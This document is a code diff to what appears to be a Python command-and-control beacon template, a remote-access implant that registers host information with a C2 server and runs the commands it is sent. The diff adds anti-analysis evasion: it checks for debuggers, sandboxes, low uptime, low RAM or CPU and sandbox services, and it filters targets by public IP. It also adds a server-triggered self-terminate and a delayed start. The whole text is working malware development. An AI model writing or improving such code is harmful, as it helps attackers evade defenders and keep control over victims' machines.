@@ -17,6 +17,180 @@ BEACON_ID = "{{BEACON_ID}}"
 SLEEP = {{SLEEP}}
 JITTER = {{JITTER}}
 PROTO = "{{PROTO}}"
+ALLOWED_IPS = "{{ALLOWED_IPS}}"
+BLOCKED_IPS = "{{BLOCKED_IPS}}"
+
+
+# ==================== SANDBOX DETECTION ====================
+
+SANDBOX_PROCS = [
+    "wireshark", "fiddler", "procmon", "procmon64", "procexp", "procexp64",
+    "x32dbg", "x64dbg", "ollydbg", "windbg", "idaq", "idaq64",
+    "autoruns", "pestudio", "sandboxie", "sbiectrl",
+    "cuckoomon", "joeboxcontrol", "joeboxserver",
+    "dumpcap", "httpdebugger", "fakenet", "apimonitor",
+    "strace", "ltrace", "gdb", "sysdig",
+]
+
+SANDBOX_HOSTNAMES = [
+    "SANDBOX", "CUCKOO", "TEQUILA",
+    "FVFF1M7J", "WILEYPC", "INTELPRO",
+    "FLAREVM", "TPMNOTIFY", "REMNUX",
+]
+
+SANDBOX_USERS = [
+    "sandbox", "cuckoo", "currentuser", "wdagutilityaccount",
+    "hapubws", "maltest", "malnetvm", "yfkol", "remnux",
+]
+
+
+def is_sandbox():
+    try:
+        hn = platform.node().upper()
+        un = (os.getenv("USERNAME") or os.getenv("USER", "")).lower()
+        for p in SANDBOX_HOSTNAMES:
+            if hn == p:
+                return True
+        for p in SANDBOX_USERS:
+            if un == p:
+                return True
+
+        if platform.system() == "Windows":
+            try:
+                r = subprocess.run(
+                    ["tasklist", "/fo", "csv", "/nh"],
+                    capture_output=True, text=True, timeout=10,
+                )
+                procs = r.stdout.lower()
+                for p in SANDBOX_PROCS:
+                    if p in procs:
+                        return True
+            except Exception:
+                pass
+
+            try:
+                import ctypes
+                k32 = ctypes.windll.kernel32
+                uptime_ms = k32.GetTickCount64()
+                if uptime_ms < 30 * 60 * 1000:
+                    return True
+            except Exception:
+                pass
+
+            # Check TEMP dir file count
+            try:
+                tmp = os.getenv("TEMP") or os.getenv("TMP", "")
+                if tmp and len(os.listdir(tmp)) < 10:
+                    return True
+            except Exception:
+                pass
+
+            # Check sandbox services
+            try:
+                for svc in ["SbieSvc", "CuckooMon", "Joeboxserver", "cmdvirth"]:
+                    r = subprocess.run(["sc", "query", svc], capture_output=True, text=True, timeout=5)
+                    if "RUNNING" in r.stdout:
+                        return True
+            except Exception:
+                pass
+
+        else:
+            # Linux uptime check
+            try:
+                with open("/proc/uptime") as f:
+                    uptime_sec = float(f.read().split()[0])
+                if uptime_sec < 1800:
+                    return True
+            except Exception:
+                pass
+
+        import multiprocessing
+        if multiprocessing.cpu_count() < 2:
+            return True
+
+        # RAM check
+        if platform.system() == "Windows":
+            try:
+                import ctypes
+
+                class MEMORYSTATUSEX(ctypes.Structure):
+                    _fields_ = [
+                        ("dwLength", ctypes.c_ulong),
+                        ("dwMemoryLoad", ctypes.c_ulong),
+                        ("ullTotalPhys", ctypes.c_ulonglong),
+                        ("ullAvailPhys", ctypes.c_ulonglong),
+                        ("ullTotalPageFile", ctypes.c_ulonglong),
+                        ("ullAvailPageFile", ctypes.c_ulonglong),
+                        ("ullTotalVirtual", ctypes.c_ulonglong),
+                        ("ullAvailVirtual", ctypes.c_ulonglong),
+                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
+                    ]
+
+                mem = MEMORYSTATUSEX()
+                mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
+                ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
+                if mem.ullTotalPhys < 2 * 1024 * 1024 * 1024:
+                    return True
+            except Exception:
+                pass
+        else:
+            try:
+                with open("/proc/meminfo") as f:
+                    for line in f:
+                        if line.startswith("MemTotal:"):
+                            mem_kb = int(line.split()[1])
+                            if mem_kb < 2 * 1024 * 1024:
+                                return True
+                            break
+            except Exception:
+                pass
+
+    except Exception:
+        pass
+    return False
+
+
+def check_ip_filter():
+    if not ALLOWED_IPS and not BLOCKED_IPS:
+        return True
+    try:
+        req = urllib.request.Request("http://api.ipify.org")
+        resp = urllib.request.urlopen(req, timeout=5)
+        public_ip = resp.read().decode().strip()
+    except Exception:
+        try:
+            req = urllib.request.Request("http://ifconfig.me/ip")
+            resp = urllib.request.urlopen(req, timeout=5)
+            public_ip = resp.read().decode().strip()
+        except Exception:
+            return True  # fail-open
+    try:
+        import ipaddress
+        ip = ipaddress.ip_address(public_ip)
+        if BLOCKED_IPS:
+            for entry in BLOCKED_IPS.split("|"):
+                entry = entry.strip()
+                if not entry:
+                    continue
+                if "/" in entry:
+                    if ip in ipaddress.ip_network(entry, strict=False):
+                        return False
+                elif str(ip) == entry:
+                    return False
+        if ALLOWED_IPS:
+            for entry in ALLOWED_IPS.split("|"):
+                entry = entry.strip()
+                if not entry:
+                    continue
+                if "/" in entry:
+                    if ip in ipaddress.ip_network(entry, strict=False):
+                        return True
+                elif str(ip) == entry:
+                    return True
+            return False
+    except Exception:
+        pass
+    return True
 
 
 def get_internal_ip():
@@ -331,13 +505,16 @@ def http_post(url, data):
     try:
         body = json.dumps(data).encode()
         req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
-        urllib.request.urlopen(req, timeout=10)
+        resp = urllib.request.urlopen(req, timeout=10)
+        return resp.read().decode()
     except Exception:
-        pass
+        return ""
 
 
 def http_register():
-    http_post(C2_URL + "/checkin", get_host_info())
+    resp = http_post(C2_URL + "/checkin", get_host_info())
+    if resp == "__TERMINATE__":
+        os._exit(0)
 
 
 def http_send_result(task_id, output):
@@ -356,6 +533,9 @@ def http_checkin():
         )
         resp = urllib.request.urlopen(req, timeout=10)
         body = resp.read().decode()
+
+        if body == "__TERMINATE__":
+            os._exit(0)
 
         if body.startswith("SLEEP "):
             parts = body.split()
@@ -433,7 +613,10 @@ def run_tcp():
         try:
             # Register
             tcp_write_msg(sock, {"type": "register", "data": get_host_info()})
-            tcp_read_msg(sock)  # ack
+            ack = tcp_read_msg(sock)
+            if ack.get("type", "") == "terminate":
+                sock.close()
+                os._exit(0)
 
             # Main loop
             while True:
@@ -444,7 +627,11 @@ def run_tcp():
 
                 msg_type = resp.get("type", "")
 
-                if msg_type == "tasks":
+                if msg_type == "terminate":
+                    sock.close()
+                    os._exit(0)
+
+                elif msg_type == "tasks":
                     tasks = resp.get("data", [])
                     for task in tasks:
                         cmd = task.get("command", "")
@@ -479,6 +666,11 @@ def run_tcp():
 # ==================== MAIN ====================
 
 if __name__ == "__main__":
+    time.sleep(10)
+    if is_sandbox():
+        os._exit(0)
+    if not check_ip_filter():
+        os._exit(0)
     if PROTO == "tcp":
         run_tcp()
     else:
